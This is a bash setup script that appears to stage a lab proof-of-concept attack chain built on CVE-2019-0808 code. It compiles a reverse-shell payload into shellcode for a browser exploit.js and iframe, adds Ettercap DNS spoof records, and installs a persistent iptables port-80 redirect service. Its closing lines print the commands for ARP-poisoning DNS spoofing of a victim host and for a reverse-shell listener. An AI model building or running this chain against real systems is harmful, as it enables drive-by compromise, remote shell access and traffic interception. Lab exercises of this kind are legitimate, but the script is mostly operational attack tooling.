#!/usr/bin/env bash
set -euo pipefail
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

package_root="$(CDPATH= cd -- "$(dirname -- "$0")" && pwd)"
poc_root="$package_root"
deps_root="$package_root/offline-poc-deps"
upstream_root="$package_root/offline-upstream-cve-2019-0808"
srdi_root="$package_root/offline-srdi"
toolchains_root="$package_root/toolchains"
toolchain_name=llvm-mingw-20260616-msvcrt-ubuntu-22.04-x86_64
toolchain_archive="$package_root/$toolchain_name.tar.xz"
toolchain_root="$toolchains_root/$toolchain_name"
compiler="$toolchain_root/bin/i686-w64-mingw32-clang++"
build_dir="$poc_root/build"
dns_file=/etc/ettercap/etter.dns
dns_backup=/etc/ettercap/etter.dns.pre-poc
port_service=/etc/systemd/system/poc-port80-redirect.service

for command_name in python3 git unzip tar sha256sum sed tee grep ettercap iptables systemctl; do
    if ! command -v "$command_name" >/dev/null 2>&1; then
        echo "STOP: missing command: $command_name" >&2
        exit 1
    fi
done

if [[ $EUID -eq 0 ]]; then
    privilege=()
elif command -v sudo >/dev/null 2>&1; then
    privilege=(sudo)
else
    echo 'STOP: root privileges or sudo are required for Ettercap setup' >&2
    exit 1
fi

iptables_path="$(command -v iptables)"

for required_file in \
    "$package_root/PACKAGE.sha256" \
    "$toolchain_archive" \
    "$deps_root/upstream-worktree.zip" \
    "$deps_root/upstream-git.zip" \
    "$deps_root/srdi-worktree.zip" \
    "$deps_root/srdi-git.zip" \
    "$poc_root/host2_single_run/exploit.js" \
    "$poc_root/host2_single_run/wasm/helloo.js" \
    "$poc_root/host2_single_run/wasm/helloo.wasm"
do
    if [[ ! -f "$required_file" ]]; then
        echo "STOP: missing package file: $required_file" >&2
        exit 1
    fi
done

if [[ -e "$upstream_root" || -e "$srdi_root" || -e "$build_dir" ]]; then
    echo "STOP: generated build directories already exist" >&2
    echo "Extract poc.zip into a new /home/kali/poc directory." >&2
    exit 1
fi

echo '[1/9] Verifying packaged files'
(
    cd "$package_root"
    sha256sum -c PACKAGE.sha256
)

echo '[2/9] Extracting portable llvm-mingw'
mkdir -p "$toolchains_root"
tar -xJf "$toolchain_archive" -C "$toolchains_root"
if [[ ! -x "$compiler" ]]; then
    echo "STOP: compiler extraction failed: $compiler" >&2
    exit 1
fi
"$compiler" --version

echo '[3/9] Restoring pinned source repositories'
mkdir -p "$upstream_root" "$srdi_root"
unzip -q "$deps_root/upstream-worktree.zip" -d "$upstream_root"
unzip -q "$deps_root/upstream-git.zip" -d "$upstream_root"
unzip -q "$deps_root/srdi-worktree.zip" -d "$srdi_root"
unzip -q "$deps_root/srdi-git.zip" -d "$srdi_root"

upstream_commit="$(git -C "$upstream_root" rev-parse HEAD)"
srdi_commit="$(git -C "$srdi_root" rev-parse HEAD)"
if [[ "$upstream_commit" != c95c8123fe37ea34b82f7560ae683bde7889d4eb ]]; then
    echo "STOP: unexpected upstream commit: $upstream_commit" >&2
    exit 1
fi
if [[ "$srdi_commit" != 9fdd5c44383039519accd1e6bac4acd5a046a92c ]]; then
    echo "STOP: unexpected sRDI commit: $srdi_commit" >&2
    exit 1
fi

echo '[4/9] Building the PoC reverse-shell payload'
cd "$poc_root"
python3 scripts/build.py \
    --upstream-root "$upstream_root" \
    --srdi-root "$srdi_root" \
    --compiler "$compiler" \
    --output-dir "$build_dir"

echo '[5/9] Staging generated shellcode.js'
python3 scripts/prepare_runtime.py \
    "$upstream_root" \
    --build-dir "$build_dir"

echo '[6/9] Writing and checking the runtime manifest'
sha256sum \
    build/FullChainEmbedded.dll \
    build/shellcode.bin \
    host1_wrapper/iframe.html \
    host2_single_run/exploit.js \
    host2_single_run/shellcode.js \
    | tee MANIFEST.sha256
sha256sum -c MANIFEST.sha256

echo '[7/9] Running unit tests'
python3 -m unittest discover -s tests -v

echo '[8/9] Configuring Ettercap DNS spoof records'
if ! "${privilege[@]}" test -f "$dns_file"; then
    echo "STOP: Ettercap DNS file not found: $dns_file" >&2
    exit 1
fi
if ! "${privilege[@]}" test -e "$dns_backup"; then
    "${privilege[@]}" cp -a "$dns_file" "$dns_backup"
fi
"${privilege[@]}" sed -i -E \
    '/^(portal\.lab\.test|exp\.portal\.lab\.test)[[:space:]]+A[[:space:]]/d' \
    "$dns_file"
printf '%s\n' \
    'portal.lab.test A 10.10.10.20 60' \
    'exp.portal.lab.test A 10.10.10.20 60' \
    | "${privilege[@]}" tee -a "$dns_file" >/dev/null
"${privilege[@]}" grep -E \
    '^(portal\.lab\.test|exp\.portal\.lab\.test)[[:space:]]+A' \
    "$dns_file"
"${privilege[@]}" ettercap -P list | grep -w dns_spoof >/dev/null

echo '[9/9] Installing persistent TCP port 80 redirect'
"${privilege[@]}" tee "$port_service" >/dev/null <<EOF
[Unit]
Description=PoC TCP port 80 to 8000 redirect
After=network-online.target
Wants=network-online.target
ConditionPathExists=/sys/class/net/eth0

[Service]
Type=oneshot
RemainAfterExit=yes
ExecStart=/bin/sh -c '$iptables_path -t nat -C PREROUTING -i eth0 -p tcp -d 10.10.10.20 --dport 80 -j REDIRECT --to-ports 8000 || $iptables_path -t nat -A PREROUTING -i eth0 -p tcp -d 10.10.10.20 --dport 80 -j REDIRECT --to-ports 8000'
ExecStop=/bin/sh -c '$iptables_path -t nat -C PREROUTING -i eth0 -p tcp -d 10.10.10.20 --dport 80 -j REDIRECT --to-ports 8000 && $iptables_path -t nat -D PREROUTING -i eth0 -p tcp -d 10.10.10.20 --dport 80 -j REDIRECT --to-ports 8000 || true'

[Install]
WantedBy=multi-user.target
EOF
"${privilege[@]}" systemctl daemon-reload
"${privilege[@]}" systemctl enable --now poc-port80-redirect.service
"${privilege[@]}" systemctl is-enabled --quiet poc-port80-redirect.service
"${privilege[@]}" systemctl is-active --quiet poc-port80-redirect.service
"${privilege[@]}" "$iptables_path" -t nat -C PREROUTING \
    -i eth0 -p tcp -d 10.10.10.20 --dport 80 \
    -j REDIRECT --to-ports 8000

echo
echo 'BUILD COMPLETE'
echo "PoC root: $poc_root"
echo 'HTTP server: python3 -u scripts/lab_http_server.py --log http-access.log'
echo 'Reverse shell: python3 -u scripts/reverse_shell.py'
echo 'DNS spoof: sudo ettercap -T -q -i eth0 -M arp -P dns_spoof /10.10.10.30// /10.10.10.53//'
echo 'Port redirect: systemctl status poc-port80-redirect.service --no-pager'
